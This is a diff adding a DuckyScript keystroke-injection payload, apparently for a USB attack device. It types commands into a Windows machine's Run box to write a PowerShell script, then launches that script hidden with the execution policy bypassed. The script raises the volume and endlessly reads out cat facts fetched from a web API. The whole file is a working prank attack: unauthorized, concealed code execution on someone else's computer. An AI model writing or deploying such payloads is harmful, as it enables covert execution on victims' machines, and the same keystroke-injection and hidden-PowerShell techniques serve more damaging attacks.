@@ -1,0 +1,55 @@
+GUI R
+DELAY 150
+STRING cmd
+DELAY 500
+ENTER
+DELAY 400
+STRING mkdir c:\t3mp
+ENTER
+DELAY 250
+STRING echo Add-Type -AssemblyName System.Speech >> c:\t3mp\facts.ps1
+DELAY 100
+ENTER
+STRING echo Function Set-Speaker($Volume){ >> c:\t3mp\facts.ps1
+DELAY 100
+ENTER
+STRING echo $wshShell = new-object -com wscript.shell >> c:\t3mp\facts.ps1
+DELAY 100
+ENTER
+STRING echo 1..50 ^| % {$wshShell.SendKeys([char]174)} >> c:\t3mp\facts.ps1
+DELAY 100
+ENTER
+STRING echo 1..$Volume ^| % {$wshShell.SendKeys([char]175)}} >> c:\t3mp\facts.ps1
+DELAY 100
+ENTER
+STRING echo Set-Speaker -Volume 50 >> c:\t3mp\facts.ps1
+DELAY 100
+ENTER
+STRING echo while ($true){ >> c:\t3mp\facts.ps1
+DELAY 100
+ENTER
+STRING echo $Cat=Invoke-WebRequest -Uri 'https://catfact.ninja/fact' -UseBasicParsing^|Select-Object -ExpandProperty 'Content'^|ConvertFrom-Json >> c:\t3mp\facts.ps1
+DELAY 100
+ENTER
+STRING echo $Speaker=New-Object System.Speech.Synthesis.SpeechSynthesizer >> c:\t3mp\facts.ps1
+DELAY 100
+ENTER
+STRING echo $Speaker.Speak($Cat.Fact) >> c:\t3mp\facts.ps1
+DELAY 100
+ENTER
+STRING echo $duration=get-random -Minimum 10 -Maximum 30 >> c:\t3mp\facts.ps1
+DELAY 100
+ENTER
+STRING echo $duration >> c:\t3mp\facts.ps1
+DELAY 100
+ENTER
+STRING echo start-sleep -seconds $duration} >> c:\t3mp\facts.ps1
+DELAY 100
+ENTER
+DELAY 100
+ALT F4
+DELAY 250
+GUI R
+DELAY 150
+STRING cmd /c start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\t3mp\facts.ps1"
+ENTER
